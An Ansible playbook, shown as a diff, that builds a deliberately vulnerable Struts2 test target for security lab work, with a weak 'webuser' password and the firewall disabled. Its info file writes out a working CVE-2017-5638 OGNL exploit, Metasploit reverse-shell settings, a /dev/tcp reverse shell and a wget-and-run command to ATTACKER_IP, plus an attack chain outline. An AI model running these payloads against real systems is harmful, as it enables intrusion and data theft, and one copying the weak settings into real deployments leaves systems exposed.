@@ -1,0 +1,311 @@
+---
+- name: Deploy Single Struts2 Vulnerable Server
+  hosts: struts2_vm
+  become: yes
+  
+  vars:
+    tomcat_version: "8.5.93"
+    tomcat_home: "/opt/tomcat"
+  
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+    
+    - name: Install Java 8
+      apt:
+        name: openjdk-8-jdk
+        state: present
+    
+    # 获取实际的 Java 路径
+    - name: Find Java 8 home directory
+      shell: dirname $(dirname $(readlink -f $(which java)))
+      register: java_home_result
+      changed_when: false
+    
+    - name: Set Java home fact
+      set_fact:
+        java_home_path: "{{ java_home_result.stdout }}"
+    
+    - name: Display Java home
+      debug:
+        msg: "Java home: {{ java_home_path }}"
+    
+    - name: Create tomcat group
+      group:
+        name: tomcat
+        state: present
+    
+    - name: Create tomcat user
+      user:
+        name: tomcat
+        group: tomcat
+        home: "{{ tomcat_home }}"
+        createhome: no
+        system: yes
+        shell: /bin/false
+    
+    - name: Create Tomcat directory
+      file:
+        path: "{{ tomcat_home }}"
+        state: directory
+        owner: tomcat
+        group: tomcat
+        mode: '0755'
+    
+    - name: Download Tomcat 8
+      get_url:
+        url: "https://archive.apache.org/dist/tomcat/tomcat-8/v{{ tomcat_version }}/bin/apache-tomcat-{{ tomcat_version }}.tar.gz"
+        dest: "/tmp/apache-tomcat-{{ tomcat_version }}.tar.gz"
+        timeout: 60
+    
+    - name: Extract Tomcat
+      unarchive:
+        src: "/tmp/apache-tomcat-{{ tomcat_version }}.tar.gz"
+        dest: "{{ tomcat_home }}"
+        remote_src: yes
+        extra_opts: [--strip-components=1]
+        owner: tomcat
+        group: tomcat
+        creates: "{{ tomcat_home }}/bin"
+    
+    - name: Set permissions on Tomcat directories
+      file:
+        path: "{{ tomcat_home }}"
+        owner: tomcat
+        group: tomcat
+        recurse: yes
+    
+    - name: Make Tomcat scripts executable
+      file:
+        path: "{{ item }}"
+        mode: '0755'
+      loop:
+        - "{{ tomcat_home }}/bin/catalina.sh"
+        - "{{ tomcat_home }}/bin/startup.sh"
+        - "{{ tomcat_home }}/bin/shutdown.sh"
+    
+    - name: Download vulnerable Struts2 application from Maven Central
+      get_url:
+        url: https://repo1.maven.org/maven2/org/apache/struts/struts2-showcase/2.3.12/struts2-showcase-2.3.12.war
+        dest: "{{ tomcat_home }}/webapps/struts2-showcase.war"
+        mode: '0644'
+        owner: tomcat
+        group: tomcat
+        timeout: 60
+    
+    # 创建 setenv.sh 来设置环境变量（更可靠的方法）
+    - name: Create setenv.sh for Tomcat
+      copy:
+        dest: "{{ tomcat_home }}/bin/setenv.sh"
+        content: |
+          #!/bin/bash
+          export JAVA_HOME="{{ java_home_path }}"
+          export CATALINA_PID="{{ tomcat_home }}/temp/tomcat.pid"
+          export CATALINA_HOME="{{ tomcat_home }}"
+          export CATALINA_BASE="{{ tomcat_home }}"
+          export CATALINA_OPTS="-Xms512M -Xmx1024M -server -XX:+UseParallelGC"
+          export JAVA_OPTS="-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom"
+        owner: tomcat
+        group: tomcat
+        mode: '0755'
+    
+    - name: Create systemd service file for Tomcat
+      copy:
+        dest: /etc/systemd/system/tomcat.service
+        content: |
+          [Unit]
+          Description=Apache Tomcat Web Application Container
+          After=network.target
+          
+          [Service]
+          Type=forking
+          
+          User=tomcat
+          Group=tomcat
+          
+          Environment="JAVA_HOME={{ java_home_path }}"
+          Environment="CATALINA_PID={{ tomcat_home }}/temp/tomcat.pid"
+          Environment="CATALINA_HOME={{ tomcat_home }}"
+          Environment="CATALINA_BASE={{ tomcat_home }}"
+          
+          ExecStart={{ tomcat_home }}/bin/startup.sh
+          ExecStop={{ tomcat_home }}/bin/shutdown.sh
+          
+          # Give tomcat time to startup
+          TimeoutStartSec=120
+          
+          RestartSec=10
+          Restart=on-failure
+          
+          # Create temp directory if it doesn't exist
+          ExecStartPre=/bin/mkdir -p {{ tomcat_home }}/temp
+          ExecStartPre=/bin/chown -R tomcat:tomcat {{ tomcat_home }}/temp
+          
+          [Install]
+          WantedBy=multi-user.target
+        mode: '0644'
+    
+    - name: Ensure Tomcat temp directory exists
+      file:
+        path: "{{ tomcat_home }}/temp"
+        state: directory
+        owner: tomcat
+        group: tomcat
+        mode: '0755'
+    
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+    
+    - name: Enable and start Tomcat service
+      systemd:
+        name: tomcat
+        state: started
+        enabled: yes
+    
+    - name: Wait for Tomcat to start
+      wait_for:
+        port: 8080
+        delay: 10
+        timeout: 120
+    
+    - name: Create vulnerable user account (webuser)
+      shell: |
+        if ! id webuser >/dev/null 2>&1; then
+          useradd -m -s /bin/bash webuser
+        fi
+        echo 'webuser:password123' | chpasswd
+      args:
+        executable: /bin/bash
+    
+    - name: Disable firewall for testing
+      ufw:
+        state: disabled
+    
+    - name: Get target IP address
+      set_fact:
+        target_ip: "{{ ansible_default_ipv4.address }}"
+    
+    - name: Create info file
+      copy:
+        dest: /root/TARGET_INFO.txt
+        content: |
+          ===================================================
+          VULNERABLE STRUTS2 TEST TARGET
+          ===================================================
+          
+          Service: Apache Struts2 Showcase Application
+          Vulnerability: CVE-2017-5638 (S2-045)
+          Struts2 Version: 2.3.12 (vulnerable)
+          Tomcat Version: {{ tomcat_version }}
+          Java Home: {{ java_home_path }}
+          Port: 8080
+          URL: http://{{ target_ip }}:8080/struts2-showcase/
+          
+          Tomcat Home: {{ tomcat_home }}
+          Service: systemctl status tomcat
+          Logs: tail -f {{ tomcat_home }}/logs/catalina.out
+          
+          ===================================================
+          EXPLOITATION DETAILS
+          ===================================================
+          
+          Vulnerability Type: Remote Code Execution via Content-Type header
+          Attack Vector: OGNL Expression Injection
+          
+          Vulnerable Endpoints: ANY endpoint accepting multipart/form-data
+          
+          ===================================================
+          TEST COMMAND (from attacker machine)
+          ===================================================
+          
+          # Basic command execution test
+          curl -i -X POST http://{{ target_ip }}:8080/struts2-showcase/integration/saveGangster.action \
+          -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+          
+          ===================================================
+          METASPLOIT USAGE
+          ===================================================
+          
+          use exploit/multi/http/struts2_content_type_ognl
+          set RHOSTS {{ target_ip }}
+          set RPORT 8080
+          set TARGETURI /struts2-showcase/integration/saveGangster.action
+          set PAYLOAD linux/x64/meterpreter/reverse_tcp
+          set LHOST <your_ip>
+          set LPORT 4444
+          exploit
+          
+          ===================================================
+          ADDITIONAL TESTING
+          ===================================================
+          
+          # Simple command execution tests
+          Replace '#cmd='id'' with:
+          - '#cmd='whoami''
+          - '#cmd='pwd''
+          - '#cmd='cat /etc/passwd''
+          - '#cmd='ls -la /tmp''
+          - '#cmd='uname -a''
+          
+          # Reverse shell example (update ATTACKER_IP/PORT)
+          '#cmd='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1''
+          
+          # Download and execute
+          '#cmd='wget http://ATTACKER_IP/payload.sh -O /tmp/p.sh && bash /tmp/p.sh''
+          
+          ===================================================
+          CREDENTIALS
+          ===================================================
+          
+          SSH User: webuser
+          Password: password123
+          
+          Root access: sudo su (if webuser is in sudoers)
+          
+          ===================================================
+          AURORA ATTACK CHAIN EXAMPLE
+          ===================================================
+          
+          1. Initial Access: Exploit CVE-2017-5638 for RCE
+          2. Establish Persistence: Create reverse shell
+          3. Privilege Escalation: Check sudo rights, kernel exploits
+          4. Lateral Movement: Scan network, exploit other services
+          5. Data Exfiltration: Locate and extract sensitive data
+          
+          ===================================================
+        mode: '0644'
+    
+    - name: Verify Struts2 application is accessible
+      uri:
+        url: "http://{{ target_ip }}:8080/struts2-showcase/"
+        status_code: 200
+        timeout: 30
+      register: struts2_check
+      retries: 3
+      delay: 5
+      until: struts2_check.status == 200
+    
+    - name: Display completion message
+      debug:
+        msg:
+          - "========================================================="
+          - "✓ Struts2 vulnerable target deployed successfully!"
+          - "========================================================="
+          - "Target URL: http://{{ target_ip }}:8080/struts2-showcase/"
+          - "Java Home: {{ java_home_path }}"
+          - "Info file: /root/TARGET_INFO.txt"
+          - ""
+          - "Quick test:"
+          - "  curl http://{{ target_ip }}:8080/struts2-showcase/"
+          - ""
+          - "SSH access:"
+          - "  ssh webuser@{{ target_ip }}"
+          - "  Password: password123"
+          - ""
+          - "Service management:"
+          - "  sudo systemctl status tomcat"
+          - "  sudo tail -f {{ tomcat_home }}/logs/catalina.out"
+          - "========================================================="
